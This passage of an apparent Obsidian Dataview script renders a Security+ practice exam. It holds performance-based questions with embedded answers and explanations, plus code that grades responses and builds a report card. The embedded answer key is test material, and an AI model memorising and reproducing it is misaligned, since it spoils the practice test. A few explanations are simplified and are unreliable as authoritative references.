stapling","w":"Stapling moves the OCSP-check work to the server, reducing client latency and CA load."}],"objective":"1.4","url":"https://professormesser.link/701010408"},
  {"n":2,"title":"Endpoint hardening by device type","type":"match","prompt":"A regional retailer is hardening two device classes: field-staff tablets and corporate workstations. For each control below, pick the device class it most naturally belongs to (or 'Not applicable' if it isn't a useful fit for either).","options":["Field tablet","Corporate workstation","Not applicable"],"items":[{"id":"2a","desc":"MDM enrollment with remote wipe","answer":"Field tablet","w":"MDM is the mobile-device management plane — designed for tablets and phones, not desktops."},{"id":"2b","desc":"Full-disk encryption","answer":"Field tablet","w":"Both could use FDE, but it's mandatory on the device most likely to leave the office. Tablets get lost or stolen — workstation FDE is good practice but a smaller risk delta."},{"id":"2c","desc":"Host-based firewall managed via Group Policy","answer":"Corporate workstation","w":"Group Policy is a Windows AD construct — applies to domain-joined workstations, not BYOD-style tablets."},{"id":"2d","desc":"Biometric unlock (face or fingerprint)","answer":"Field tablet","w":"Tablets have built-in cameras and fingerprint sensors; most workstations don't."},{"id":"2e","desc":"EDR agent with kernel-level telemetry","answer":"Corporate workstation","w":"EDR has rich support on full desktop OSes; mobile EDR exists but is much more limited."},{"id":"2f","desc":"Air-gapped network isolation","answer":"Not applicable","w":"Field tablets are by definition connected; workstations aren't air-gapped either. Air-gapping is for isolated industrial systems."},{"id":"2g","desc":"Open-source intelligence scanning","answer":"Not applicable","w":"OSINT is a reconnaissance technique, not an endpoint hardening control."}],"objective":"4.1","url":"https://professormesser.link/701040102"},
  {"n":3,"title":"Incident response sequence","type":"match","prompt":"Place each NIST incident response phase in the correct position. Each position number is used exactly once.","options":["1","2","3","4","5","6","7"],"items":[{"id":"3a","desc":"Preparation","answer":"1","w":"Comes first — done before anything happens. Tools, runbooks, contact lists, training."},{"id":"3b","desc":"Detection","answer":"2","w":"Identifying that something is happening — alerts, anomalies, user reports."},{"id":"3c","desc":"Analysis","answer":"3","w":"Confirming it's real, scoping it, classifying severity. Often paired with detection but distinct."},{"id":"3d","desc":"Containment","answer":"4","w":"Stop the spread before cleaning up. Isolate hosts, kill sessions, block traffic."},{"id":"3e","desc":"Eradication","answer":"5","w":"Remove the cause — kill the malware, close the vulnerability, revoke the credentials."},{"id":"3f","desc":"Recovery","answer":"6","w":"Restore service. Bring systems back online, validate they're clean, monitor closely."},{"id":"3g","desc":"Lessons learned","answer":"7","w":"Postmortem — what worked, what didn't, what to change in Preparation next time. Closes the loop."}],"objective":"4.8","url":"https://professormesser.link/701040801"},
  {"n":4,"title":"Cryptographic technique by purpose","type":"match","prompt":"Match each cryptographic technique to the security goal it primarily addresses. Each technique is used exactly once.","options":["Hashing","Digital signature","Symmetric encryption","Salting","Key stretching","HMAC"],"items":[{"id":"4a","desc":"Storing passwords so the original can't be recovered, even by the database administrator","answer":"Hashing","w":"One-way function. Verify by hashing the supplied password and comparing — never store the plaintext."},{"id":"4b","desc":"Adding unique per-user randomness so two users with the same password get different hashes","answer":"Salting","w":"Defeats precomputed rainbow tables and stops attackers from spotting users with matching passwords."},{"id":"4c","desc":"Bulk-encrypting a large file with a single shared key, fast","answer":"Symmetric encryption","w":"AES and friends. Single key for both encrypt and decrypt — fast, but the key has to be distributed securely."},{"id":"4d","desc":"Proving a message came from a specific sender and wasn't altered in transit","answer":"Digital signature","w":"Sender hashes the message, encrypts the hash with their private key. Anyone with the public key can verify."},{"id":"4e","desc":"Verifying message integrity AND authenticity using a shared secret, without asymmetric crypto","answer":"HMAC","w":"Keyed hash — output depends on both message and shared key. Cheaper than digital signatures, but no non-repudiation."},{"id":"4f","desc":"Making password-hash brute-forcing computationally painful by running the hash function thousands of times","answer":"Key stretching","w":"bcrypt, PBKDF2, scrypt, Argon2. Slows down each guess from microseconds to milliseconds — devastating to attackers."}],"objective":"1.4","url":"https://professormesser.link/701010406"},
  {"n":5,"title":"Stateful firewall rules — segmented architecture","type":"firewall","prompt":"A mid-size company has a DMZ and an internal network separated by a stateful firewall. Complete the rules below to meet each policy goal. Because the firewall is stateful, only the initiating direction needs a rule.","servers":[{"name":"Reverse Proxy (DMZ)","ip":"10.20.30.5"},{"name":"Public DNS (DMZ)","ip":"10.20.30.10"},{"name":"SMTP Relay (DMZ)","ip":"10.20.30.25"},{"name":"App Server (Internal)","ip":"172.16.50.8"},{"name":"Internal DNS (Internal)","ip":"172.16.50.53"},{"name":"Backup Server (Internal)","ip":"172.16.50.99"}],"ports":["20","21","22","23","25","53","80","110","143","389","443","445","636","3389"],"rules":[{"id":"5a","goal":"Allow the Reverse Proxy to reach the App Server over HTTPS so the proxy can forward incoming web traffic.","answer":{"srcIP":"10.20.30.5","dstIP":"172.16.50.8","proto":"TCP","port":"443","action":"Allow"},"w":"Reverse proxy initiates the back-end connection. HTTPS = TCP/443. DMZ-to-internal flow needs explicit allow."},{"id":"5b","goal":"Block any direct SSH from the Public DNS server to the Backup Server — backups are managed only from the admin jump host (not shown).","answer":{"srcIP":"10.20.30.10","dstIP":"172.16.50.99","proto":"TCP","port":"22","action":"Block"},"w":"SSH = TCP/22. The Public DNS box has no business touching internal backups; this is an explicit defense-in-depth deny."},{"id":"5c","goal":"Allow the SMTP Relay in the DMZ to query the Internal DNS server so it can resolve internal hostnames during message routing.","answer":{"srcIP":"10.20.30.25","dstIP":"172.16.50.53","proto":"UDP","port":"53","action":"Allow"},"w":"DNS queries are UDP/53 by default (TCP/53 for zone transfers and large responses). Source is the SMTP relay; destination is internal DNS."}],"objective":"4.5","url":"https://professormesser.link/701040501"}
];

const domainNames = {"1": "1.0 General Security Concepts", "2": "2.0 Threats, Vulnerabilities, and Mitigations", "3": "3.0 Security Architecture", "4": "4.0 Security Operations", "5": "5.0 Security Program Management & Oversight"};

// ---- State ----
const selections = {}; // qNum -> Set of letters
questions.forEach(q => { selections[q.n] = new Set(); });
const pbqSelections = {};
pbqs.forEach(p => { pbqSelections[p.n] = {}; });
let graded = false;

// ---- Render setup ----
const root = dv.container;
root.empty();

const style = root.createEl("style");
style.textContent = `
  .pe-intro { padding: 12px 16px; background: var(--background-secondary); border-radius: 6px; margin-bottom: 18px; font-size: 0.9em; color: var(--text-muted); }
  .pe-progress { position: sticky; top: 0; z-index: 10; padding: 10px 14px; background: var(--background-secondary); border-radius: 6px; font-size: 0.9em; color: var(--text-muted); margin-bottom: 20px; border: 1px solid var(--background-modifier-border); }
  .pe-card { border: 1px solid var(--background-modifier-border); padding: 18px 22px; margin-bottom: 22px; border-radius: 8px; background: var(--background-primary-alt); scroll-margin-top: 60px; }
  .pe-q-header { display: flex; align-items: baseline; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
  .pe-q-num { font-weight: 700; color: var(--text-muted); font-size: 0.85em; letter-spacing: 0.05em; }
  .pe-q-tag { font-size: 0.75em; padding: 2px 8px; border-radius: 10px; background: var(--background-secondary); color: var(--text-muted); border: 1px solid var(--background-modifier-border); }
  .pe-q-tag.multi { background: rgba(187, 128, 9, 0.12); color: var(--text-normal); border-color: rgba(187, 128, 9, 0.4); }
  .pe-q-text { font-weight: 500; line-height: 1.55; font-size: 1.0em; white-space: pre-wrap; word-wrap: break-word; }
  .pe-opt { display: flex; align-items: center; gap: 10px; width: 100%; text-align: left; padding: 10px 14px; margin: 7px 0; border: 1px solid var(--background-modifier-border); background: var(--background-secondary); cursor: pointer; border-radius: 6px; color: var(--text-normal); font-size: 0.95em; line-height: 1.45; transition: all 120ms ease; font-family: inherit; }
  .pe-opt:hover:not(:disabled) { background: var(--background-modifier-hover); }
  .pe-opt.selected { background: rgba(56, 139, 253, 0.14); border-color: rgba(56, 139, 253, 0.55); }
  .pe-opt-letter { font-weight: 600; color: var(--text-muted); flex-shrink: 0; min-width: 18px; }
  .pe-opt-text { flex: 1; }
  .pe-opt.graded-correct-selected { background: rgba(63, 185, 80, 0.18); border-color: rgba(63, 185, 80, 0.55); }
  .pe-opt.graded-correct-missed { background: rgba(63, 185, 80, 0.08); border-color: rgba(63, 185, 80, 0.45); border-style: dashed; }
  .pe-opt.graded-wrong-selected { background: rgba(248, 81, 73, 0.14); border-color: rgba(248, 81, 73, 0.5); }
  .pe-opt.graded-neutral { opacity: 0.65; }
  .pe-grade-btn { display: block; margin: 30px auto 10px; padding: 13px 36px; font-size: 1.05em; font-weight: 600; background: var(--interactive-accent); color: var(--text-on-accent); border: none; border-radius: 8px; cursor: pointer; transition: all 120ms ease; }
  .pe-grade-btn:hover:not(:disabled) { filter: brightness(1.1); }
  .pe-grade-btn:disabled { opacity: 0.6; cursor: not-allowed; }
  .pe-feedback { margin-top: 14px; padding: 12px 16px; border-radius: 6px; font-size: 0.9em; line-height: 1.55; display: none; }
  .pe-feedback.correct { background: rgba(63, 185, 80, 0.08); border-left: 3px solid rgba(63, 185, 80, 0.6); }
  .pe-feedback.incorrect { background: rgba(248, 81, 73, 0.08); border-left: 3px solid rgba(248, 81, 73, 0.55); }
  .pe-feedback .pe-fb-row { margin: 6px 0; }
  .pe-feedback .pe-fb-letter { display: inline-block; font-weight: 600; margin-right: 6px; }
  .pe-feedback .pe-fb-link { margin-top: 8px; font-size: 0.85em; color: var(--text-muted); }
  .pe-feedback .pe-fb-link a { color: var(--text-accent); text-decoration: none; }
  .pe-report { padding: 22px 26px; margin: 0 0 28px; border-radius: 10px; background: var(--background-primary-alt); border: 2px solid var(--background-modifier-border); }
  .pe-report h2 { margin-top: 0; }
  .pe-score-line { font-size: 1.3em; font-weight: 600; margin: 10px 0; }
  .pe-score-percent { font-size: 1.6em; }
  .pe-score-percent.pass { color: rgb(63, 185, 80); }
  .pe-score-percent.fail { color: rgb(248, 81, 73); }
  .pe-pass-note { font-size: 0.9em; color: var(--text-muted); margin: 6px 0 18px; }
  .pe-domain-table { width: 100%; border-collapse: collapse; margin: 10px 0; font-size: 0.9em; }
  .pe-domain-table th, .pe-domain-table td { padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--background-modifier-border); }
  .pe-domain-table th { font-weight: 600; color: var(--text-muted); }
  .pe-domain-table .pe-dt-score { text-align: right; font-variant-numeric: tabular-nums; }
  .pe-miss-list { margin: 14px 0 4px; padding-left: 20px; }
  .pe-miss-list li { margin: 6px 0; font-size: 0.9em; }
  .pe-miss-list a { color: var(--text-accent); text-decoration: none; }
  .pe-miss-list a:hover { text-decoration: underline; }
  .pbq-section-header { margin-top: 8px; margin-bottom: 14px; font-size: 1.05em; color: var(--text-muted); font-weight: 600; letter-spacing: 0.02em; border-bottom: 1px solid var(--background-modifier-border); padding-bottom: 8px; }
  .pbq-prompt { font-style: italic; color: var(--text-muted); margin: 8px 0 14px; font-size: 0.92em; line-height: 1.5; }
  .pbq-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
  .pbq-table td { padding: 9px 10px; vertical-align: middle; border-bottom: 1px solid var(--background-modifier-border); font-size: 0.95em; }
  .pbq-table td.pbq-desc-cell { padding-right: 18px; line-height: 1.45; }
  .pbq-table td.pbq-sel-cell { width: 230px; text-align: right; }
  .pbq-select { padding: 6px 10px; border-radius: 4px; border: 1px solid var(--background-modifier-border); background: var(--background-secondary); color: var(--text-normal); font-size: 0.9em; min-width: 210px; font-family: inherit; }
  .pbq-select:focus { outline: 2px solid var(--interactive-accent); outline-offset: 1px; }
  .pbq-select:disabled { opacity: 0.85; cursor: default; }
  .pbq-row-correct { background: rgba(63, 185, 80, 0.08); }
  .pbq-row-wrong { background: rgba(248, 81, 73, 0.06); }
  .pbq-srv-list { font-size: 0.85em; color: var(--text-muted); margin: 10px 0; padding: 9px 12px; background: var(--background-secondary); border-radius: 4px; line-height: 1.7; }
  .pbq-rule { margin: 14px 0; padding: 12px 14px; background: var(--background-secondary); border-radius: 6px; border: 1px solid var(--background-modifier-border); }
  .pbq-rule-goal { font-weight: 500; margin-bottom: 10px; font-size: 0.92em; line-height: 1.5; }
  .pbq-fw-table { width: 100%; border-collapse: collapse; font-size: 0.85em; }
  .pbq-fw-table th { text-align: left; padding: 4px 6px; color: var(--text-muted); font-weight: 600; font-size: 0.78em; text-transform: uppercase; letter-spacing: 0.03em; }
  .pbq-fw-table td { padding: 4px 6px; }
  .pbq-fw-select { min-width: 95px; font-size: 0.85em; padding: 4px 8px; }
  .pbq-report-tbl { width: 100%; border-collapse: collapse; margin: 10px 0 14px; font-size: 0.9em; }
  .pbq-report-tbl th, .pbq-report-tbl td { padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--background-modifier-border); }
  .pbq-report-tbl th { font-weight: 600; color: var(--text-muted); }
  .pbq-report-tbl .pbq-rt-score { text-align: right; font-variant-numeric: tabular-nums; }
  .pbq-report-tbl a { color: var(--text-accent); text-decoration: none; }
  .pbq-report-tbl a:hover { text-decoration: underline; }
`;

const intro = root.createDiv({ cls: "pe-intro" });
intro.setText(`5 performance-based questions + ${questions.length} multiple-choice questions. Multi-select MCQs are flagged below. No feedback until you click Grade my test at the bottom.`);

const progress = root.createDiv({ cls: "pe-progress" });
const countPbqItems = (p) => {
  if (p.type === "match") return p.items.length;
  if (p.type === "firewall") return p.rules.reduce((s, r) => s + Object.keys(r.answer).length, 0);
  return 0;
};
const countPbqAnswered = (p) => {
  if (p.type === "match") return Object.values(pbqSelections[p.n]).filter(v => v).length;
  if (p.type === "firewall") {
    let n = 0;
    p.rules.forEach(r => {
      const sel = pbqSelections[p.n][r.id] || {};
      Object.keys(r.answer).forEach(k => { if (sel[k]) n++; });
    });
    return n;
  }
  return 0;
};
const pbqItemsTotal = pbqs.reduce((s, p) => s + countPbqItems(p), 0);
const updateProgress = () => {
  if (graded) return;
  const mcqAnswered = questions.filter(q => selections[q.n].size > 0).length;
  const pbqAnswered = pbqs.reduce((s, p) => s + countPbqAnswered(p), 0);
  progress.setText(`PBQ ${pbqAnswered}/${pbqItemsTotal}  ·  MCQ ${mcqAnswered}/${questions.length}`);
};
updateProgress();

const reportContainer = root.createDiv();

const pbqHeader = root.createDiv({ cls: "pbq-section-header" });
pbqHeader.setText("Performance-Based Questions · B1–B5");

const pbqContainer = root.createDiv();

pbqs.forEach(p => {
  const card = pbqContainer.createDiv({ cls: "pe-card" });
  card.id = `pe-pbq-${p.n}`;

  const hdr = card.createDiv({ cls: "pe-q-header" });
  hdr.createEl("span", { cls: "pe-q-num", text: `PBQ · B${p.n}` });
  if (p.objective) {
    const objTag = hdr.createEl("span", { cls: "pe-q-tag" });
    objTag.setText(`Obj ${p.objective}`);
  }

  card.createEl("div", { cls: "pe-q-text", text: p.title });
  const promptEl = card.createDiv({ cls: "pbq-prompt" });
  promptEl.setText(p.prompt);

  if (p.type === "match") {
    const tbl = card.createEl("table", { cls: "pbq-table" });
    p.items.forEach(item => {
      const tr = tbl.createEl("tr");
      tr.dataset.itemId = item.id;
      tr.createEl("td", { cls: "pbq-desc-cell", text: item.desc });
      const tdSel = tr.createEl("td", { cls: "pbq-sel-cell" });
      const sel = tdSel.createEl("select", { cls: "pbq-select" });
      const def = sel.createEl("option", { text: "— Select —" });
      def.value = "";
      p.options.forEach(opt => {
        const o = sel.createEl("option", { text: opt });
        o.value = opt;
      });
      sel.onchange = () => {
        if (graded) return;
        pbqSelections[p.n][item.id] = sel.value;
        updateProgress();
      };
    });
  } else if (p.type === "firewall") {
    const srvList = card.createDiv({ cls: "pbq-srv-list" });
    srvList.createEl("strong", { text: "Servers: " });
    p.servers.forEach((s, i) => {
      srvList.appendText(`${s.name} ${s.ip}`);
      if (i < p.servers.length - 1) srvList.appendText("  ·  ");
    });

    p.rules.forEach((rule, idx) => {
      const ruleBox = card.createDiv({ cls: "pbq-rule" });
      ruleBox.dataset.ruleId = rule.id;
      ruleBox.createEl("div", { cls: "pbq-rule-goal", text: `Rule ${idx + 1}: ${rule.goal}` });

      const tbl = ruleBox.createEl("table", { cls: "pbq-fw-table" });
      const thead = tbl.createEl("thead");
      const trh = thead.createEl("tr");
      ["Source IP", "Destination IP", "Protocol", "Port", "Action"].forEach(h => {
        trh.createEl("th", { text: h });
      });
      const tbody = tbl.createEl("tbody");
      const tr = tbody.createEl("tr");

      const ipOptions = p.servers.map(s => s.ip);
      const fields = [
        { key: "srcIP", options: ipOptions },
        { key: "dstIP", options: ipOptions },
        { key: "proto", options: ["TCP", "UDP"] },
        { key: "port", options: p.ports },
        { key: "action", options: ["Allow", "Block"] }
      ];

      fields.forEach(f => {
        const td = tr.createEl("td");
        const sel = td.createEl("select", { cls: "pbq-select pbq-fw-select" });
        const def = sel.createEl("option", { text: "—" });
        def.value = "";
        f.options.forEach(opt => {
          const o = sel.createEl("option", { text: opt });
          o.value = opt;
        });
        sel.dataset.field = f.key;
        sel.onchange = () => {
          if (graded) return;
          if (!pbqSelections[p.n][rule.id]) pbqSelections[p.n][rule.id] = {};
          pbqSelections[p.n][rule.id][f.key] = sel.value;
          updateProgress();
        };
      });
    });
  }

  const fb = card.createDiv({ cls: "pe-feedback" });
  fb.dataset.pbqN = p.n;
});

const mcqHeader = root.createDiv({ cls: "pbq-section-header" });
mcqHeader.setText("Multiple-Choice Questions · B6–B90");
mcqHeader.style.marginTop = "30px";


const cardsContainer = root.createDiv();

questions.forEach((q) => {
  const correctCount = q.opts.filter(o => o.c).length;
  const isMulti = correctCount > 1;

  const card = cardsContainer.createDiv({ cls: "pe-card" });
  card.id = `pe-q-${q.n}`;

  const header = card.createDiv({ cls: "pe-q-header" });
  header.createEl("span", { cls: "pe-q-num", text: `Q${q.n - 5}  ·  B${q.n}` });
  if (isMulti) {
    const tag = header.createEl("span", { cls: "pe-q-tag multi" });
    tag.setText(`Select ${correctCount}`);
  }
  if (q.objective) {
    const objTag = header.createEl("span", { cls: "pe-q-tag" });
    objTag.setText(`Obj ${q.objective}`);
  }

  card.createEl("div", { cls: "pe-q-text", text: q.q });

  const optButtons = {};
  q.opts.forEach(opt => {
    const btn = card.createEl("button", { cls: "pe-opt" });
    const letterSpan = btn.createEl("span", { cls: "pe-opt-letter", text: `${opt.l}.` });
    const textSpan = btn.createEl("span", { cls: "pe-opt-text", text: opt.t });
    optButtons[opt.l] = btn;
    btn.onclick = () => {
      if (graded) return;
      const sel = selections[q.n];
      if (isMulti) {
        if (sel.has(opt.l)) {
          sel.delete(opt.l);
          btn.classList.remove("selected");
        } else {
          sel.add(opt.l);
          btn.classList.add("selected");
        }
      } else {
        sel.clear();
        Object.values(optButtons).forEach(b => b.classList.remove("selected"));
        sel.add(opt.l);
        btn.classList.add("selected");
      }
      updateProgress();
    };
  });

  const feedback = card.createDiv({ cls: "pe-feedback" });
  feedback.dataset.qnum = q.n;
});

const gradeBtn = root.createEl("button", { cls: "pe-grade-btn", text: "Grade my test" });

gradeBtn.onclick = () => {
  if (graded) return;
  graded = true;
  gradeBtn.disabled = true;
  gradeBtn.setText("Test graded — scroll up for your report card");
  progress.style.display = "none";

  // ---- Grade PBQs ----
  let pbqItemsCorrect = 0;
  const pbqResults = {};

  pbqs.forEach(p => {
    pbqResults[p.n] = { correct: 0, total: 0, details: [] };
    const card = document.getElementById(`pe-pbq-${p.n}`);
    card.querySelectorAll("select.pbq-select").forEach(s => { s.disabled = true; });

    if (p.type === "match") {
      p.items.forEach(item => {
        const got = pbqSelections[p.n][item.id] || "";
        const right = (got === item.answer);
        pbqResults[p.n].total += 1;
        if (right) { pbqResults[p.n].correct += 1; pbqItemsCorrect += 1; }
        pbqResults[p.n].details.push({ kind: "match", desc: item.desc, got, expected: item.answer, right, w: item.w });
        const tr = card.querySelector(`tr[data-item-id="${item.id}"]`);
        if (tr) tr.classList.add(right ? "pbq-row-correct" : "pbq-row-wrong");
      });
    } else if (p.type === "firewall") {
      p.rules.forEach(rule => {
        const sel = pbqSelections[p.n][rule.id] || {};
        const fieldRights = {};
        let ruleAllRight = true;
        Object.keys(rule.answer).forEach(k => {
          const got = sel[k] || "";
          const right = (got === rule.answer[k]);
          fieldRights[k] = { got, expected: rule.answer[k], right };
          pbqResults[p.n].total += 1;
          if (right) { pbqResults[p.n].correct += 1; pbqItemsCorrect += 1; }
          else ruleAllRight = false;
        });
        pbqResults[p.n].details.push({ kind: "firewall", goal: rule.goal, fields: fieldRights, w: rule.w, allRight: ruleAllRight });
        const rb = card.querySelector(`div[data-rule-id="${rule.id}"]`);
        if (rb) rb.classList.add(ruleAllRight ? "pbq-row-correct" : "pbq-row-wrong");
      });
    }

    const fb = card.querySelector(".pe-feedback");
    const allRight = pbqResults[p.n].correct === pbqResults[p.n].total;
    fb.classList.add(allRight ? "correct" : "incorrect");
    fb.style.display = "";
    const headerRow = fb.createDiv({ cls: "pe-fb-row" });
    headerRow.innerHTML = `<strong>${allRight ? "✓" : "✗"} ${pbqResults[p.n].correct} / ${pbqResults[p.n].total} item${pbqResults[p.n].total === 1 ? "" : "s"} correct</strong>`;

    pbqResults[p.n].details.forEach((d, idx) => {
      if (d.kind === "match") {
        const row = fb.createDiv({ cls: "pe-fb-row" });
        const mark = d.right ? "✓" : "✗";
        const yourPart = d.got ? `picked <em>${escapeHtml(d.got)}</em>` : `<em>no answer</em>`;
        row.innerHTML = `<strong>${mark}</strong> ${escapeHtml(d.desc)} → <strong>${escapeHtml(d.expected)}</strong>${d.right ? "" : ` &nbsp;(${yourPart})`}`;
        if (!d.right && d.w) {
          const why = fb.createDiv();
          why.style.marginLeft = "22px";
          why.style.fontSize = "0.88em";
          why.style.color = "var(--text-muted)";
          why.style.marginTop = "2px";
          why.setText(d.w);
        }
      } else if (d.kind === "firewall") {
        const row = fb.createDiv({ cls: "pe-fb-row" });
        row.style.marginTop = "10px";
        const mark = d.allRight ? "✓" : "✗";
        row.innerHTML = `<strong>${mark} Rule ${idx + 1}:</strong> ${escapeHtml(d.goal)}`;
        Object.keys(d.fields).forEach(k => {
          const f = d.fields[k];
          if (!f.right) {
            const sub = fb.createDiv();
            sub.style.marginLeft = "22px";
            sub.style.fontSize = "0.88em";
            const labelMap = { srcIP: "Source IP", dstIP: "Destination IP", proto: "Protocol", port: "Port", action: "Action" };
            sub.innerHTML = `<strong>${labelMap[k]}:</strong> ${escapeHtml(f.expected)} <span style="color:var(--text-muted)">(you picked ${escapeHtml(f.got || "—")})</span>`;
          }
        });
        if (!d.allRight && d.w) {
          const why = fb.createDiv();
          why.style.marginLeft = "22px";
          why.style.fontSize = "0.88em";
          why.style.color = "var(--text-muted)";
          why.style.marginTop = "4px";
          why.setText(d.w);
        }
      }
    });

    if (p.url) {
      const linkRow = fb.createDiv({ cls: "pe-fb-link" });
      linkRow.innerHTML = `Reference: <a href="${p.url}" target="_blank" rel="noopener">Objective ${escapeHtml(p.objective)}</a>`;
    }
  });

  let totalCorrect = 0;
  const missed = [];
  const domainStats = {};

  questions.forEach((q) => {
    const sel = selections[q.n];
    const correctLetters = new Set(q.opts.filter(o => o.c).map(o => o.l));
    const allRight = sel.size === correctLetters.size && [...sel].every(l => correctLetters.has(l));

    if (q.domain) {
      if (!domainStats[q.domain]) domainStats[q.domain] = { right: 0, total: 0 };
      domainStats[q.domain].total += 1;
      if (allRight) domainStats[q.domain].right += 1;
    }

    if (allRight) totalCorrect += 1;
    else missed.push(q);

    const card = document.getElementById(`pe-q-${q.n}`);
    const buttons = card.querySelectorAll(".pe-opt");
    buttons.forEach(btn => {
      const letter = btn.querySelector(".pe-opt-letter").innerText.replace(".", "");
      const isSel = sel.has(letter);
      const isCorrect = correctLetters.has(letter);
      btn.classList.remove("selected");
      btn.disabled = true;
      if (isCorrect && isSel) btn.classList.add("graded-correct-selected");
      else if (isCorrect && !isSel) btn.classList.add("graded-correct-missed");
      else if (!isCorrect && isSel) btn.classList.add("graded-wrong-selected");
      else btn.classList.add("graded-neutral");
    });

    const fb = card.querySelector(".pe-feedback");
    fb.classList.add(allRight ? "correct" : "incorrect");
    fb.style.display = "";

    const headerRow = fb.createDiv({ cls: "pe-fb-row" });
    headerRow.innerHTML = allRight
      ? "<strong>✓ Correct</strong>"
      : (sel.size === 0
          ? "<strong>✗ No answer</strong>"
          : "<strong>✗ Incorrect</strong>");

    const firstCorrect = q.opts.find(o => o.c);
    if (firstCorrect) {
      const row = fb.createDiv({ cls: "pe-fb-row" });
      const correctLettersStr = q.opts.filter(o => o.c).map(o => o.l).join(", ");
      const correctTexts = q.opts.filter(o => o.c).map(o => o.t).join("; ");
      const strong = row.createEl("strong");
      strong.setText(`Answer: ${correctLettersStr}. ${correctTexts}`);
      const why = row.createDiv();
      why.style.marginTop = "6px";
      why.setText(firstCorrect.w);
    }

    const wrongPicked = [...sel].filter(l => !correctLetters.has(l));
    if (wrongPicked.length > 0) {
      const row = fb.createDiv({ cls: "pe-fb-row" });
      row.style.marginTop = "10px";
      const strong = row.createEl("strong");
      strong.setText("Why your pick was wrong:");
      wrongPicked.forEach(l => {
        const opt = q.opts.find(o => o.l === l);
        const sub = row.createDiv();
        sub.style.marginTop = "4px";
        sub.innerHTML = `<span class="pe-fb-letter">${l}.</span> ${escapeHtml(opt.w)}`;
      });
    }

    if (q.url) {
      const linkRow = fb.createDiv({ cls: "pe-fb-link" });
      linkRow.innerHTML = `Reference: <a href="${q.url}" target="_blank" rel="noopener">${escapeHtml(q.topic)}</a>`;
    }
  });

  const total = questions.length;
  const pct = (totalCorrect / total) * 100;
  const strictPass = pct >= 83;

  reportContainer.empty();
  const report = reportContainer.createDiv({ cls: "pe-report" });
  report.createEl("h2", { text: "Report Card" });

  const scoreLine = report.createDiv({ cls: "pe-score-line" });
  scoreLine.innerHTML = `MCQ: ${totalCorrect} / ${total} correct&nbsp;&nbsp;<span class="pe-score-percent ${strictPass ? "pass" : "fail"}">${pct.toFixed(1)}%</span>`;

  const passNote = report.createDiv({ cls: "pe-pass-note" });
  passNote.setText(strictPass
    ? `Above the ~83% CompTIA scaled-pass benchmark. Solid.`
    : `Below the ~83% CompTIA scaled-pass benchmark (≈ 750/900). Review the misses below.`);

  // PBQ section in report
  report.createEl("h3", { text: "Performance-Based (B1–B5)" });
  const pbqRptTbl = report.createEl("table", { cls: "pbq-report-tbl" });
  const pbqThead = pbqRptTbl.createEl("thead");
  const pbqTrh = pbqThead.createEl("tr");
  pbqTrh.createEl("th", { text: "PBQ" });
  pbqTrh.createEl("th", { text: "Topic" });
  pbqTrh.createEl("th", { text: "Score", cls: "pbq-rt-score" });
  pbqTrh.createEl("th", { text: "%", cls: "pbq-rt-score" });
  const pbqTbody = pbqRptTbl.createEl("tbody");
  pbqs.forEach(p => {
    const r = pbqResults[p.n];
    const tr = pbqTbody.createEl("tr");
    const tdN = tr.createEl("td");
    const link = tdN.createEl("a", { href: `#pe-pbq-${p.n}`, text: `B${p.n}` });
    link.onclick = (e) => {
      e.preventDefault();
      document.getElementById(`pe-pbq-${p.n}`).scrollIntoView({ behavior: "smooth", block: "start" });
    };
    tr.createEl("td", { text: p.title });
    tr.createEl("td", { text: `${r.correct} / ${r.total}`, cls: "pbq-rt-score" });
    const pct2 = r.total > 0 ? (r.correct / r.total * 100).toFixed(0) : "—";
    tr.createEl("td", { text: `${pct2}%`, cls: "pbq-rt-score" });
  });
  const pbqTotalItems = pbqs.reduce((s, p) => s + pbqResults[p.n].total, 0);
  const pbqSummary = report.createDiv();
  pbqSummary.style.fontSize = "0.9em";
  pbqSummary.style.marginTop = "4px";
  pbqSummary.style.marginBottom = "18px";
  pbqSummary.innerHTML = `<strong>PBQ total:</strong> ${pbqItemsCorrect} / ${pbqTotalItems} items`;

  // Domain breakdown
  report.createEl("h3", { text: "By domain" });
  const table = report.createEl("table", { cls: "pe-domain-table" });
  const thead = table.createEl("thead");
  const trh = thead.createEl("tr");
  trh.createEl("th", { text: "Domain" });
  trh.createEl("th", { text: "Score", cls: "pe-dt-score" });
  trh.createEl("th", { text: "%", cls: "pe-dt-score" });
  const tbody = table.createEl("tbody");
  Object.keys(domainNames).sort().forEach(d => {
    const s = domainStats[d] || { right: 0, total: 0 };
    if (s.total === 0) return;
    const tr = tbody.createEl("tr");
    tr.createEl("td", { text: domainNames[d] });
    tr.createEl("td", { text: `${s.right} / ${s.total}`, cls: "pe-dt-score" });
    tr.createEl("td", { text: `${((s.right / s.total) * 100).toFixed(0)}%`, cls: "pe-dt-score" });
  });

  if (missed.length > 0) {
    report.createEl("h3", { text: `Missed questions (${missed.length})` });
    const ul = report.createEl("ul", { cls: "pe-miss-list" });
    missed.forEach(q => {
      const li = ul.createEl("li");
      const a = li.createEl("a", { href: `#pe-q-${q.n}` });
      a.setText(`Q${q.n - 5} (B${q.n})`);
      a.onclick = (e) => {
        e.preventDefault();
        document.getElementById(`pe-q-${q.n}`).scrollIntoView({ behavior: "smooth", block: "start" });
      };
      const objLabel = q.objective ? ` — Obj ${q.objective}` : "";
      li.appendText(`${objLabel} — ${truncate(q.q.split("\n")[0], 90)}`);
    });
  } else {
    report.createEl("p", { text: "No misses. Clean sweep." });
  }

  report.scrollIntoView({ behavior: "smooth", block: "start" });

  // Persist results to the Misses log so they survive a reload
  try {
    const file = app.workspace.getActiveFile();
    if (file) {
      const date = new Date().toISOString().slice(0, 10);
      const missLines = missed.length === 0
        ? "  - _Clean sweep — no MCQ misses_"
        : missed.map(q => `  - A${q.n} (Obj ${q.objective || "?"}) — ${q.topic}`).join("\n");
      const pbqLines = pbqs.map(p => {
        const r = pbqResults[p.n];
        return `  - A${p.n} ${p.title}: ${r.correct}/${r.total}`;
      }).join("\n");
      const domainLines = Object.keys(domainNames).sort().map(d => {
        const s = domainStats[d] || { right: 0, total: 0 };
        if (s.total === 0) return null;
        return `  - ${domainNames[d]}: ${s.right}/${s.total} (${((s.right / s.total) * 100).toFixed(0)}%)`;
      }).filter(Boolean).join("\n");
